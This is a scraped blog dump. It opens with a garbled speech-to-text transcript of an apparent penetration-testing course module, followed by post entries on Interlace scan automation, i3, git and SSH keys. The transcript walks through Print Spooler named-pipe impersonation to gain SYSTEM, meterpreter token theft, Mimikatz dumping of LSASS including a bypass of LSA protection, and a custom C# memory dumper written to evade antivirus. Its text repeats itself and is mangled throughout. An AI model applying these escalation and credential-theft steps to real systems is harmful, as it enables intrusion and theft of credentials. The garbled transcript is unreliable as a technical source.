impersonate anyone who connects two are named pipe it’s now time to test her application leveraging The Print Spooler service communication to the spooler service is done through print system remote protocol which dates back to 2007 and is not well documented fortunately for us the MSRP RN Works through named pipes the potential for abuse comes from the RPC open printer and our PC remote find first printer change notification functions our PC open printer allows us to retrieve a handle for the printer server which is used as an argument to the second API our PC remote find first printer change notification essentially monitors printer object changes and sends change notifications to print clients once again this change notification requires the principal or to access the print client if we ensure that the print client is are named pipe it will obtain a system token that we can impersonate sadly unlike regular win32api MSRP RN apis cannot be called directly principal or functionality resides in an unmanaged library and is called through a proxy function once again this change notification requires the principal or to access the print client if we ensure that the print client is are named pipe it will obtain a system token that we can impersonate sadly unlike regular win32api MSRP RN apis cannot be called directly principal or functionality resides in an unmanaged the library and is called through a proxy function that uses a binary format to pass and invoke underlying functions the implementation of these calls are beyond the scope of this module luckily we can use the spool sample C sharp implementation written by Lee Christensen or the Powershell code written by Vincent Le 2 when we use School sample we must specify the name of the server to connect to and the name of the server we control also called the capture server since we’re performing the attack locally both servers are the same this presents a challenge The Print Spooler service running as system on the victim needs to contact the simulated print client through our pipe but since they’re on the same hoes they in effect required the same pipe name because of this we cannot create the name pipe with the required name in order to find a solution we first must understand the problem in detail to do this we’ll monitor the target system with sysinternals process monitor while executing spool sample. Exe against an arbitrary hype name first will configure capture filter with filter filter and select process name from the drop-down menu setting this to spool serve. Exe will then click add followed by a plaid and exit the filter menu by selecting okay then we’ll execute spool sample and specify the current host name followed by an arbitrary named pipe although the application output indicates that a printer notification callback was configured process monitor shows that no access to the arbitrary pipe name has occurred the reason for this is that before attempting to access the client pipe The Print Spooler service validates the pipe path making sure it matches the default name our arbitrary pipe test fails this validation and consequently The Print Spooler service doesn’t even attempt to connect to the client this is why we don’t see any connections in process monitor unfortunately as mentioned before we cannot specify spool SS as a name since it’s already in use by The Print Spooler service we’re targeting at this point it’s useful to know what happens when a file path is supplied to a win32api when directory separators are used as part of the file path they are converted to canonical form specifically forward slash has will be converted to backwards lashes this is also known as file path normalization interesting Lee enough a security researcher discovered that if we provide spool sample with an arbitrary pipe name containing a forward slash after the host name the spooler service will not interpret it correctly and it will depend the default name to our own path before processing it this effectively bypasses the path validation and the resulting path is then normalized before the spooler service attempts to send a print object change notification message to the client this can obviously help us because the pipe name differs from the default name used by The Print Spooler service and we can register it to stimulate a print client to verify this we can repeat our last example this time supplying an arbitrary pipe name that contains a forward slash in the print client name we receive an error and process monitor confirms the theory first the path we supplied has been switched to a canonical form as part of the full path II spool serve. Exe attempted to access the named pipe since we have not created a pipe server by that name the request failed at this point we just need to create a pipe server with that name and simulate a print client when we execute spool sample The Print Spooler service will connect to our pipe did you this will open another command prompt as network service because we’re demonstrating a scenario where we’ve exploded a process that has the SE in person a privilege and we’re trying to escalate to system and launch our application now will invoke spool sample to trigger the change notification against the capture server our application reveals a connection from the S15 18 CID or application reveals a connection from the S15 18 CID this Sid value belongs to the system account proving that our technique worked excellent we now have a way of forcing the system account to authenticate to our named pipe which allows us to impersonate it this Sid value belongs to the system account proving that our technique worked excellent we now have a way of forcing the system account to authenticate to our names pipe which allows us to impersonate it you complete this attack we must now take advantage of the impersonated token which we will do by first launching a command prompt as system the win32 create process with token wapi can create a new process based on a token the token must be a primary token so will first use duplicate token X to convert the impersonation token to a primary token first will supply the impersonation token by recovering it with open thread token will request full access to the token with the numerical value hex f01 ff4 the d w desired access argument for the third argument will use a default security descriptor for the new token by setting this to know impersonation level must be set to security impersonation which is the access type we currently have to the Token this has a numerical value of 2 for the token type will specify a primary token by setting this to won the final argument is a pointer that will be populated with the handle to the duplicated token what’s a token duplicated as a primary token we can call create process with token to create a command prompt as system with the token duplicated as a primary token we can call create process with token to create a command prompt as system first we’ll Supply the newly duplicated token followed by a log on option which we set to its default of 0 for the third and fourth arguments will supply and the full path of cmd.exe respectively the creation Flags environment block and current directory arguments can be set to 0 no and no respectively to select the default option for the last two arguments we must pass start up info and process information structures which are populated by the API during execution the creation Flags environment block and Corinth directory arguments can be set to 0 no and no respectively to select the default option for the last two arguments we must pass start up info and process information structures which are populated by the API during execution neither of these are defined in p and VOC Imports so we must Define them ourselves as shown in the following code with all the code written will compile it and transfer it to the Windows Server 2019 machine will execute this just as before my first a launching or application in the context of the network service to create the pipe server on app serves 01 will execute this just as before by first a launching or application in the context of the network service to create the pipe server on app serves 01 next will launch spool sample with the capture server set to app serves 01 pipe test which will force the system account to connect to our names pipe and a new command prompt is opened next will launch spool sample with the capture server set to app serves 01 height test which will force the system account to connect to our names pipe and a new command prompt is opened when we interact with it and display the user we find it to be system with this attack we can Elevate our privileges from a nun privileged account that has se impersonate privilege to system on any modern window System including Windows 2019 and the newest versions of Windows 10 nice with this attack we can Elevate our privileges from a nun privileged account that has se impersonate privilege II system on any modern window System including Windows 2019 and the newest versions of Windows 10 nice most native and third-party services that do not require administrative permissions run as network service or local service partly due to Microsoft’s recommendation this attack technique means that compromising and unprivileged service is just as valuable as a system service in the next section will demonstrate how to impersonate tokens from other authenticated users instead of Simply advancing straight to systemfun with incognito in this section will use the matter printer Incognito module to impersonate any logged-in users and obtain code execution in their contacts without access to any passwords for hashes although we’ll use Mimi cats to collect Kerberos authentication credentials later in this module this access token attack Vector does not rely on Mimi cat and may evade some detection software to demonstrate this will authenticate to app serves 01 as the admin user through remote desktop and leave The Connection open will then switch to a system Integrity meterpreter shell next will load the Incognito extension through the load command will then switch to a system Integrity meterpreter shell next will do the Incognito extension through the load command and run help to display available commands will focus on list tokens - you which will list all currently used tokens by unique username the output reveals a delegation token for the admin domain user next will run impersonate token to impersonate the admin user through the impersonate logged on user API to invoke it we must specify the username of the token we want to impersonate the output shows that we were able to impersonate the admin domain user from a delegation token which will allow us to perform actions on this server and authenticate against remote computers in the context of that user with this approach we have impersonated a user within a mature Porter shell without writing to diskKerberos and domain credentials in an active directory implementation Kerberos handles most user and Integrated Service authentication in the following sections will explore how the Kerberos protocol is implemented in Windows and how we can leverage it for credential stealingKerberos Authentication the Microsoft implementation of the Kerberos Authentication Protocol was adopted from the Kerberos version 5 Authentication Protocol developed by MIT and has been Microsoft primary authentication mechanism since Windows Server 2003 while ntlm authentication Works through a principle of Challenge and response windows-based Kerberos authentication uses a ticket system at a high-level Kerberos client authentication to a service in active directory involves the use of a domain controller in the role of a key distribution center or KDC let’s review this process in detail in order to lay a foundation for discussion in the following section when the user logs in a request is sent to the domain controller or DC this DC serves as a k DC and runs the authentication server service the initial authentication server request contains a timestamp encrypted using a hash derived from the current user username and password when the service receives the request it looks up the password hash associated with that user and attempts to decrypt the timestamp if the decryption process is successful and the timestamp is not a duplicate the authentication is considered successful the service replies to the client with an authentication server reply which contains a session key since her berosus stateless and a ticket granting ticket or TGT this DC serves as a k DC and runs the authentication server service the initial authentication server request contains a timestamp encrypted using a hash derived from the current user username and password when the service received the request it looks up the password hash associated with that user and attempts to decrypt the timestamp if the decryption process is successful and the timestamp is not a duplicate the authentication is considered successful the service replies to the client with an authentication server reply which contains a session key since her borrosas stateless and a ticket granting ticket or TGT the session key is encrypted using the user’s password hash which the client could decrypt and reuse the TGT contains user information including memberships the domain a timestamp the IP address of the client and the second key in order to avoid tampering the ticket granting ticket is encrypted by a secret key known only to the ktc and cannot be decrypted by the client once the client has received the session key and the TGT the ktc considers the client authentication complete by default the TGT will be valid for 10 hours during this time the user is not required to retype the password additionally the TGT can be renewed without entering the password when the user attempt to access domain resources such as a network share exchange mailbox or some other application with a registered service the second key is encrypted using the user’s password hash which the client could decrypt and reuse the TGT contains user information including memberships the domain a timestamp the IP address of the client and the session key in order to avoid tampering the ticket granting ticket is encrypted by a secret key known only to the ktc and cannot be decrypted by the client once the client has received the session key and the TGT the ktc considers the client authentication complete by default the TGT will be valid for 10 hours during this time the user is not required to retype the password additionally the TGT can be renewed without entering the password when the user attempts to access domain resources such as a network share exchange mailbox or some other application with a registered service people named or SPN the ktc is again contacted this time the client constructs a ticket granting service request packet that consists of the current user and a timestamp encrypted using the second key the ESPN of the resource and the encrypted TGT possible name or SPN the ktc is again contacted this time the client constructs a ticket granting service request packet that consists of the current user and a timestamp encrypted using the second key the ESPN of the resource and the encrypted TGT next the ticket granting service on the ktc receives the ticket granting service request and if the ESPN exist in the domain the TGT is decrypted using the secret key known only to the Katy see the session key is that extracted from the decrypted TGT and this key is used to decrypt the username and time stamp of the request if the TGT has a valid timestamp where no replay is detected and the request is not expired the TGT and session key usernames match and the origin and TT IP addresses match the request is accepted if this succeeds the ticket granting service response to the client with a ticket granting server reply next the ticket granting service on the ktc receives the ticket granting service request and if the ESPN exist in the domain the TGT is decrypted using the secret key known only to the Katy see the session key is an extracted from the decrypted TGT and this key is used to decrypt the username and time stamp of the request if the TGT has a valid timestamp where no replays detected and the request is not expired the TGT and session key usernames match and the origin and TT IP addresses match the request is accepted if this succeeds the ticket granting service response to the client with a ticket granting server reply this packet contains three parts the ESPN to which access has been granted a session key to be used between the client and the ESPN and a service ticket containing the username and memberships along with the newly-created session key the first two parts the SPN in the session key are encrypted using the session key associated with the creation of the TGT and the service ticket is encrypted using the password hash of the service account registered with the target SPN once the authentication process with the ktc is complete and the client as both a session key and a service ticket service authentication begins first of the client sends an application request which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself the first two parts the SPN in the session key are encrypted using the session key associated with the creation of the TGT and the service ticket is encrypted using the password hash of the service account registered with the target SPN once the authentication process with a k t c is complete and the client as both a session key and a service ticket service authentication begins 1st to the client sends an application request which includes the username and a timestamp encrypted with the session key associated with the service ticket along with this service ticket itself the service decrypts the service ticket using its own password hash extracts the session key from it and the Crips the supplied username if the usernames match the request is accepted before access is granted the service inspects the Supply Group memberships in the service ticket and the signs appropriate permissions to the user after which the user may make use of the service as required this protocol may seem complicated and perhaps even convoluted but it was designed to mitigate various Network attacks and prevent the use of fake credentials now that we’ve explored the foundations of Kerberos authentication let’s look at how we can dump cached credentials with Mimi catsmeaning cats in this section will discuss how many cats can be used to extract credentials from memory due to cashing requirements of the Kerberos protocol will also discuss local security Authority protection and how it can be bypassed due to the automatic renewal of tgt’s password hashes are cashed in the local security Authority subsystem service or else ass memory space if we gain access to these houses we could crack them to obtain the clear text password or reuse them to perform various actions which will discuss in a later module since Alsace is part of the operating system and runs as system we need system or local administrator permission to gain access to the hashes stored on a Target in addition to data structures are not publicly documented and they are encrypted with an elsass stored key Mimi cats is a powerful tool that we can use to extract and manipulate credentials tokens and privileges in Windows in this section will specifically use it to dump cash domain credentials and use it for other purposes later in this module after launching Mimi cats from an elevated command prompt on a Windows 10 victim machine will have to tamper with the memory of the elsass process which is normally not allowed since it belongs to the system user and not the current offsec user however as administrator the offsec user can use SE debug privilege to read and modify a process under the ownership of a different user did you this will use the mini cats privilege debug command to enable the SE debug privilege by calling adjust token privileges once we have enabled the SE debug privilege will dump all cashed passwords and hatches from else asked with Secor LS a log on passwords the inner workings of the commander quite complex and Beyond the scope of this module due to the inherent encryption and undocumented structures employed by elsass but the results show the ntlm hash of the opsec domain user since 2012 when we make hats was released and cash credential dumping was popularized Microsoft has developed mitigation techniques LS a protection and Windows Defender credential guard in this module will focus on LS a protection as previously mentioned Windows divides its processes into four distinct Integrity levels an additional mitigation level protected processes light PPL was introduced from Windows 8 on Words which can be layered on top of the current Integrity level in essence this means that a process running at system Integrity cannot access or modify the memory space of a process executing at system Integrity with PPL enabled to demonstrate this will log into the windows 2019 server app serves 01 as the admin user this is done through the run as ppld word value in hkey local machine system current control set control LS a with a value of 1 this is done through the run as ppld word value in hkey local machine system current control set control LSA with a value of 1 this protection mechanism is disabled by default due to third-party compatibility issues on absurd 01 LS a protection has already been configured this protection mechanism is disabled by default due to third-party compatibility issues on app serves 01 LS a protection has already been configured when elsass is executing as a protected process light Mimi cats failed due to insufficient permissions the sicurella say log on passwords command Returns the access denied error value PPL protection is controlled by a bit residing in the eprocess kernel object associated with the target process if we could obtain code execution in Colonel space we could disable the LSA protection and dump the credentials luckily this can be achieved with Mimi cats since it comes bundled with the me me Dr. Sis driver we must be local administrator or system to dump the credentials which means we will also have the SE load driver privilege and the ability to load any signed drivers many cats can load the me me Dr. Sis driver with the bang plus command if we could obtain code execution in Colonel space we could disable the LSA protection and dump the credentials luckily this can be achieved with Mimi cats since it comes bundled with a Mimi Dr. Sisques driver we must be local administrator or system to dump the credentials which means we will also have the SE load driver privilege and the ability to load any signed drivers many cats can load the me me Dr. Sis driver with the bang plus command once the driver is loaded we can use it to disable to PPL protection for elsass through the process protect command while supplying the / process option to specify the name of the process and the remove flag to disable PPL while this technique will disable dlsa protection it does require that we upload the Mimi Dr. Sis driver to the victim machine which may trigger antivirus will again attempt to dump a cached credentials while this technique will disable the ls a protection it does require that we upload the Mimi Dr. Sis driver to the victim machine which may trigger antivirus next will again attempt to dump a cached credentials according to the South put we have by pasteles a protection and have obtained the admin domain users ntlm hash in the next section will discuss how to dump Alsace memory without Mimi catsprocessing credentials offline in this section will process the credentials offline by dumping the required memory section from the targets elsass and uploading it to a different Windows machine where we can safely extract the credentials this will help avoid detection since Mimi cats will neither be uploaded to nor run from the target machinememory dump first we’ll dump the process memory of elsass Windows allows us to create a dump file which is a snapshot of a given process this dump includes loaded libraries and application memory in this example will create the dump file with task manager to open task manager will right-click the taskbar and select it first we’ll dump the process memory of Alsace Windows allows us to create a dump file which is a snapshot of a given process this dump includes loaded libraries and application memory in this example will create the dump file with task manager to open task manager will right-click the taskbar and select it next will navigate to the details Tab and locate the elsass. Exe process right-click it and choose create dump file after dumping the process memory the location of the dump file is presented in a pop-up what’s the dump file is created we can copy it from the target to our local Windows client where we can parse it with Mimi cats in this example will stimulate offline parsing by copying the dump file to the Mimi cat’s folder of the Windows 10 victim p.m. and will process it with Mimi cats there what’s the dump file is created we can copy it from the target to our local Windows client where we can parse it with me me cats in this example will stimulate offline parsing by copying the dump file to the Mimi Katz folder of the Windows 10 victim p.m. and will process it with Mimi cats there first we’ll run secure LS a mini dump supplying the name of the dump file to parse followed by sicurella say log on passwords to dump cached credentials this successfully dumps the admin domain users credentials and does not require Mimi cats on the target machine there is however one obvious disadvantage to this technique task manager cannot be run as a command line tool so we’ll need gooey access to the Target alternatively we can create the dump file from the command line with crock dump from sysinternals since Proctor may also have a signature that could be recognized in the next section will build our own code to create the dump filemini dump right dump in this section will develop our own C sharp application to execute of memory dump that we can parse with Mimi cats when task manager and Prok dump create a dump file they are invoking the win32 mini dump right dump API this means that we can write our own application in C sharp that does the same thing begin will go over the function prototype this function requires a lot of arguments but only the first four are needed for our use case the first two arguments must be a handle to Alsace and the process ID of elsass respectively the third argument is a handle to the file that will contain the generated memory dump and the fourth is an enumeration type which will set to mini dump with full memory or its numerical value of 2 to obtain a full memory dump with the foundational understanding of the API in place will create a visual Studio C sharp console app on the Windows 10 client called mini dump select release build and set the CPU architecture to 64-bit next we’ll add the P invoke translated dllimport statement for mini dump right dump before we can call mini dump right dump we have to set up the four required arguments first will obtain the process ID of elsass and open a handle to it you get the process ID we can use the get processes by name method of the process class supplying the process named as a string and select the ID property we must include the system Diagnostics namespace to make use of the process class you got the process ID we can use the get processes by name method of the process class supplying the process named as a string and select the ID property we must include the system Diagnostics namespace to make use of the process class we can obtain a handle to the Alsace process with the win32 open process API just as we would with process injection will include the dllimport statement for open process and Supply the arguments for full access no inheritance and the process ID of elsass now that we have the first two arguments and place we must set up the dump file instead of using the win32 createfile API we can take advantage of the filestream class along with its Constructor do instantiate the file stream object we must Supply to arguments the name and full path of the file and the file mode create option indicating that we want to create a new file will also include the system IO namespace to use the file stream class now that we have all the pieces in place we can invoke a mini dump right file when supplying the file handle argument to mini dump right dump we must convert it to a c style file handle through the dangerous get handle method of the safe file handle class after compiling the project we can execute it from an elevated command prompt and generate a dump file with a dump file created we can run Mimi cats to parse it as we did in the last example the output reveals that are custom c-sharp application did in fact create a valid dump file for Alsace by stepping away from pre develop tools we have improved our trade craft and likely avoided antivirus detectionwrapping up in this module we discuss the various authentication mechanisms and privilege levels implemented in Windows and demonstrated various techniques and tools to obtain credentials and escalate our privileges" }, { "title": "Automation For Pentesters Series - Part 1 Interlace", "url": "/posts/automation-pentesters-series-part-1-interlace/", "categories": "tutorial", "tags": "automation", "date": "2021-06-11 00:00:00 +0100", "snippet": "IntroductionInstalation Step one, we clone the package from Githubsudo git clone https://github.com/codingo/Interlace.git /opt/Interlace Step two, enter the directory and setup virtual environmentT...", "content": "IntroductionInstalation Step one, we clone the package from Githubsudo git clone https://github.com/codingo/Interlace.git /opt/Interlace Step two, enter the directory and setup virtual environmentThis step is optional but if you do not follow then you will install all the python packages globally which may or may not be a good thing depending on setup.We use the cd command to change the directory and the virtualenv commandcd /opt/Interlacevirtualenv venvsource venv/bin/activate Step three, we install the programFirst the Pip packagespip3 install -r requirements.txtThen install via the setup.pysudo python3.9 setup.py install This took a few minutes for me so maybe now is the time for that coffee.If you install interlace in a virtual environment then you will need to activate that environment before you use itsource /opt/Interlace/venv/bin/activateinterlace -hScanningIn the following examples, we will be looking at scans against one IP and multiple IP lists to compare.I have completed a discovery scan and I have the following IP addressescat nmap-discovery.gnmap | grep 'Status: Up' | cut -d \" \" -f 2 | tee targets.txt10.10.10.410.10.10.4310.10.10.6310.10.10.6810.10.10.13410.10.10.22910.10.10.23910.10.10.245I will put them in a file called targets.txt while we look at the syntax. Interlace allows us to run commands with things like thread taken care of. It allows variable substitution to keep scans looking uniform and handles some advanced functionality we would have to code ourselves.Blockers vs BlocksThere are several key concepts you need to understand in order to benefit from the Interlace tool.BlockersA blocker prevents execution of commands following until all commands proceeding it has been completed. We can declare a blocker as follows_blocker_BlocksBlocks can be used to run commands that you would like to run in sequence, for example creating a folder before attempting to store the input in it. Interlace tries hard to run as much in parallel as possible and keep your system resources fully balanced however some things just need to be run in a strict order!We can declare a block as follows_block:something_mkdir _output_nmap _target_ -oA _output_/nmap-default_block:something_Command Queue is IntelligentThis is important! One of the key uses of Interlace is that you use it to run commands from a file. The commands are looped over for each of the targets and items you might want to provide as command-line flags or positional values are passed available to each command in the form of strings that are replaced on each iteration _target_, _port_ and _output_ for a few examples. See below for the full table.If however you put a line down that does not include any variables that need swapping out then Interlace will only run that command once.Without going into the technical aspects of running commands at the moment, if we ran the following two commands as part of a command file against a 10.10.10.0/29 Cidr range then we would only get one DNS packet sent to Google and eight sent to the 10.10.10.0/29ping -c 1 8.8.8.8ping -c 1 _target_ This is ideal as we wouldn’t want to ping google DNS every time we ping a new host.Running CommandsWe have two main ways of running commands. Either from a file or directly from the command line.From The Command Line Running Commands Direct From Terminal.Just to reinforce last point! When I do not use a replaceable target string the command runs just once. Command Runs Once Without Replaceable StringLastly, note if I give the command two ports but no _target_ then it will run once for each port. Adding Extra Ports Increases Command Variations.From a FileWhen we create our scans from files we have more control and access to a few more features.Let us have a quick look at some of the variable replacement we have access to. Variable Replacement _target_ Replaced with the expanded target list that the current thread is running against _cleantarget_ Replaced with target cleanded from http:// or https:// _host_ Works the same as _target_, and can be used interchangeably _output_ Replaced with the output folder variable from Interlace _port_ Replaced with the expanded port variable from Interlace _realport_ Replaced with the real port variable from Interlace _proxy_ Replaced with the proxy list from Interlace _random_ Replaced with the randomly chosen file from Interlace As we pass options to Interlace they become available to us in our scans.For example, if we start a scan off like thisinterlace -t 10.10.10.0/24 -p 80 -o ./bug_bounty -cL commands.ilWe would have access to _target_, _port_ and _output_ variables within our Interlace command files (-cL is for providing Interlace with a list of commands). We might make a file such as_block:nikto_mkdir -p _output_/_target_/nikto/nikto -host _target_ -port _port_ -output _output_/nikto/nikto-_target_-_port_.htm_block:nikto_We put the commands in a block to ensure they run sequentially in their thread. We do not want Nikto trying to save to an output directory that does not exist.While Interlace can look impressive at first we can avoid some of the screen clutter by adding the following options --no-bar and --silent.interlace -t 10.10.10.0/24 -p 80 -o ./bug_bounty -cL commands.il --no-bar --silentEpanding our example even further!Open up burpsuite and echo the default proxy address into a proxy.txt file.burpsuiteecho http://127.0.0.1:8080 &gt; proxy.txtAdd the proxy option to Nikto_block:nikto_mkdir -p _output_/_target_/nikto/nikto -host _target_ -port _port_ -output _output_/nikto/nikto-_target_-_port_.htm -useproxy _proxy__block:nikto_Now as we scan our scans are caught by burpsuite. Targets Being Proxied Via Burp. One item we have not looked at yet is the -threads option. By default it is set to 10 but you can set it to what you want based on the performance of your machine.Making a CTF Fuzzer Step one, Helper Function#!/bin/bashLet us create a file as follows (There is a convention of calling interlace configurations as dot `il`)nano test.ilInside the `test.il` file we will write the followingmkdir output &amp;&amp; echo “made”ping -c 2 targetNow we will run this on the command line interlace -t 10.10.10.0/29 -cL test.il –no-bar -threads 15 –silentmkdir _target_ &amp;&amp; echo \"Made Directory For _target\"_blocker__block:ping_ping -c 2 _target__block:ping__block:curlnano staged_nmap.ilInside we will put the followingrm -rf outputmkdir -p output/target/scans/mkdir -p output/target/scans/nmapmkdir -p output/target/scans/nmblookupmkdir -p output/target/scans/cmemkdir -p output/target/loot/mkdir -p output/target/downloads/mkdir -p output/target/shells/blockernmap -sSV -vv –script banner -A –top-ports=20 target -oA output/target/scans/nmap/nmap-_target_-quick-scanblockernmap -T4 -sSV -vv -p- –max-retries=2 target -oA output/target/scans/nmap/nmap-_target_-full-65k-synnmap -T4 -sUV -vv –top-ports=2000 –max-retries=1 target -oA output/target/scans/nmap/nmap-_target_-top-2000-udpblockernmblookup -A target &gt; output/target/scans/nmblookup/nmblookup-_target_.txtcrackmapexec smb target &gt; output/target/scans/crackmapexec/cme-_target_.txtWe can now run our first command like so. interlace -tL ./targets.txt -threads 10 -cL staged_nmap.il -o /pentest/output``` Variable\tReplacementtarget\tReplaced with the expanded target list that the current thread is running againstcleantarget\tReplaced with target cleanded from http:// or https://host\tWorks the same as target, and can be used interchangeablyoutput\tReplaced with the output folder variable from Interlaceport\tReplaced with the expanded port variable from Interlacerealport\tReplaced with the real port variable from Interlaceproxy\tReplaced with the proxy list from Interlacerandom\tReplaced with the randomly chosen file from Interlace" }, { "title": "Getting Started With i3wm", "url": "/posts/getting-started-i3wm/", "categories": "tutorial", "tags": "", "date": "2021-06-08 00:00:00 +0100", "snippet": "OverviewToday we will be looking at i3. A productivity tool.Step 1: Install the softwareInstall the following packages. Note, adding -y will automatically confirm instal and you will not be prompte...", "content": "OverviewToday we will be looking at i3. A productivity tool.Step 1: Install the softwareInstall the following packages. Note, adding -y will automatically confirm instal and you will not be prompted.sudo apt install -y i3 i3-wm i3status rofi polybar Step 2: Sign-out and sign-in selecting the i3 Xsession. Sign-out and Log back in with i3.We are presented with a dialogue asking us if we would like a config generated. Press Enter. First Configuration Prompt.Next, we can confirm which we will use as the default modifier key. Press Enter to accept the Win key Choose Default Modifier and Write To FileHit Win + Enter to open up a terminal.Step 3: Configure Polybar.Make a folder for the configuration file and copy the sample provided.mkdir -p ~/.config/polybar/cp /usr/share/doc/polybar/config ~/config/polybar/Create a Polybar launcher scriptnano ~/config/polybar/launcher.shContent of the launcher field should look similar to this#!/usr/bin/env bash# Terminate already running bar instanceskillall -q polybar# If all your bars have ipc enabled, you can also use # polybar-msg cmd quit# Launch saint custom toolbarecho \"---\" | tee -a /tmp/saintbar.logpolybar saint 2&gt;&amp;1 | tee -a /tmp/saintbar.log &amp; disownecho \"Bar launched...\"Make it executable:chmod +x $HOME/.config/polybar/launch.shEdit the i3 config file. Add the launch.sh script and comment out the default i3bar.nano ~/.config/i3/config Launcher Added and Default Panel Commented OutStep 4: Install Rofi Themes.git clone --depth=1 https://github.com/adi1090x/rofi.git ~/.config/roficd rofichmod +x setup.sh./setup.sh" }, { "title": "Getting To Grips With GIT", "url": "/posts/getting-grips-git/", "categories": "tutorial", "tags": "git", "date": "2021-05-13 00:00:00 +0100", "snippet": "Creating a Git development branchYou can list all of your current branches like this:git branch -aThis shows all of the local and remote branches. Assuming you only have a single master branch, you...", "content": "Creating a Git development branchYou can list all of your current branches like this:git branch -aThis shows all of the local and remote branches. Assuming you only have a single master branch, you’d see the following:* master remotes/origin/masterThe * means the current branch.To create a new branch named development, use the following command:git checkout -b developmentThe -b flag creates the branch. Listing the branches now should show:* development master remotes/origin/masterChanging branchesIt would be best not to commit anything directly to the master branch. Instead, do all your work on the development branch and then merge your work into the master branch whenever you have a new public release.You are already in your development branch, but if you weren’t, the way to switch is as follows:git checkout development That’s the same way you create a branch but without the -b.Making changes on the developmentWhen making changes, add and commit as usual:git add .git commit -m \"Use a useful comment to identify the commit.\"The first time you push to your remote, do it as follows:git push -u origin developmentThe -u flag stands for --set-upstream. After the first time, you only need to do it like this:git pushMerging development to masterOnce your developed code is ready to be merged into your master branch, you can do it like so:First switch to your local master branch:git checkout masterTo merge development into master, do the following:git merge developmentThen push the changes in local master to the remote master:git pushDeleting a branchIf you don’t need the development branch anymore, or you want to delete it and start over, you can do the following:Delete the remote development branch:git push -d origin developmentThen delete the local branch:git branch -d developmentThe -d means delete." }, { "title": "Amazon Relational Database Service (RDS)", "url": "/posts/amazon-relational-database-service-rds/", "categories": "article", "tags": "", "date": "2021-05-07 00:00:00 +0100", "snippet": "", "content": "" }, { "title": "Penetrate. Report. Repeat", "url": "/posts/penetrate-report-repeat/", "categories": "article", "tags": "", "date": "2021-04-28 00:00:00 +0100", "snippet": "", "content": "" }, { "title": "Linux Priv Escalation and Lateral Movement With SSH Keys", "url": "/posts/linux-priv-escalation-and-lateral-movement-ssh-keys/", "categories": "article", "tags": "", "date": "2021-04-25 00:00:00 +0100", "snippet": " This article will be split up into two parts. In the first part we will look at the SSH service, its native files and commands and good practices around using it. The second part we will look at...", "content": " This article will be split up into two parts. In the first part we will look at the SSH service, its native files and commands and good practices around using it. The second part we will look at abusing many configurations. For the examples in this article, I am going to boot up two Debian servers on Vultr. System Preferences.Both Servers are version Debian 10 x64 (aka buster) I have named the hostname of the two server demo1 and demo2 to make it easy to discern between them When I first log in it asks if I want to accept the fingerprint which in this case is: “ECDSA key fingerprint is SHA256:du2f5e/Zux+XxuWWS/XdAc0ypC1OeAv5tGWUhWnaCSk”. Make a mental note of that as we will be coming back to that later on in this article. As this article is going to be on SSH keys I am going to start by generating a pair.Generating an SSH KeypairThis is not an article on server setup so I am not going to go into great detail.I am going to run the following commandssh-keygen -t RSA -b 4096 The -t specifies the type and the -b the number of bits of entropy. System Preferences. Notice the fingerprint SHA256:ALLUbdUShgY5OJztlLokHF7cv8o1vooMPwJCvNti3z8Looking at the SSH Dameon configurationLet us open the configurationnano /etc/ssh/sshd_configLet us specifically look at the options that are commented out!cat /etc/ssh/sshd_config | grep -E \"^#\"The following were the default options found on this newly booted Vultr Debian server:/# $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $/# This is the sshd server system-wide configuration file. See/# sshd_config(5) for more information./# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin/# The strategy used for options in the default sshd_config shipped with/# OpenSSH is to specify options with their default value where/# possible, but leave them commented. Uncommented options override the/# default value./# Port 22/# AddressFamily any/# ListenAddress 0.0.0.0/# ListenAddress ::/# HostKey /etc/ssh/ssh_host_rsa_key/# HostKey /etc/ssh/ssh_host_ecdsa_key/# HostKey /etc/ssh/ssh_host_ed25519_key/# Ciphers and keying/# RekeyLimit default none/# Logging/# SyslogFacility AUTH/# LogLevel INFO/# Authentication:/# LoginGraceTime 2m/# StrictModes yes/# MaxAuthTries 6/# MaxSessions 10/# PubkeyAuthentication yes/# Expect .ssh/authorized_keys2 to be disregarded by default in future./# AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2/# AuthorizedPrincipalsFile none/# AuthorizedKeysCommand none/# AuthorizedKeysCommandUser nobody/# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts/# HostbasedAuthentication no/# Change to yes if you don't trust ~/.ssh/known_hosts for/# HostbasedAuthentication/# IgnoreUserKnownHosts no/# Don't read the user's ~/.rhosts and ~/.shosts files/# IgnoreRhosts yes/# To disable tunneled clear text passwords, change to no here!/# PasswordAuthentication yes/# PermitEmptyPasswords no/# Change to yes to enable challenge-response passwords (beware issues with/# some PAM modules and threads)/# Kerberos options/# KerberosAuthentication no/# KerberosOrLocalPasswd yes/# KerberosTicketCleanup yes/# KerberosGetAFSToken no/# GSSAPI options/# GSSAPIAuthentication no/# GSSAPICleanupCredentials yes/# GSSAPIStrictAcceptorCheck yes/# GSSAPIKeyExchange no/# Set this to 'yes' to enable PAM authentication, account processing,/# and session processing. If this is enabled, PAM authentication will/# be allowed through the ChallengeResponseAuthentication and/# PasswordAuthentication. Depending on your PAM configuration,/# PAM authentication via ChallengeResponseAuthentication may bypass/# the setting of \"PermitRootLogin without-password\"./# If you just want the PAM account and session checks to run without/# PAM authentication, then enable this but set PasswordAuthentication/# and ChallengeResponseAuthentication to 'no'./# AllowAgentForwarding yes/# AllowTcpForwarding yes/# GatewayPorts no/# X11DisplayOffset 10/# X11UseLocalhost yes/# PermitTTY yes/# PrintLastLog yes/# TCPKeepAlive yes/# PermitUserEnvironment no/# Compression delayed/# ClientAliveInterval 0/# ClientAliveCountMax 3/# UseDNS no/# PidFile /var/run/sshd.pid/# MaxStartups 10:30:100/# PermitTunnel no/# ChrootDirectory none/# VersionAddendum none/# no default banner path/# Banner none/# Allow client to pass locale environment variables/# override default of no subsystems/# Example of overriding settings on a per-user basis/#Match User anoncvs/# X11Forwarding no/# AllowTcpForwarding no/# PermitTTY no/# ForceCommand cvs serverIf it is not clear to anyone reading this! the lines starting with the # have been commented out.Let us have a look at the keys we just generated System Preferences.the ~ is the shortcut symbol to the users home directory. We follow this with a . and then the name of the SSH folder (note lowercase). The SSH folder starts with a . as it is a hidden folder.Looking at the screenshot we can see by just accepting defaults and pressing through the ssh-keygen command we have a public and private key in their default place (the users directory) and they have the appropriate permissions set.Now for the next part of this article we are going to want the exact same key pair 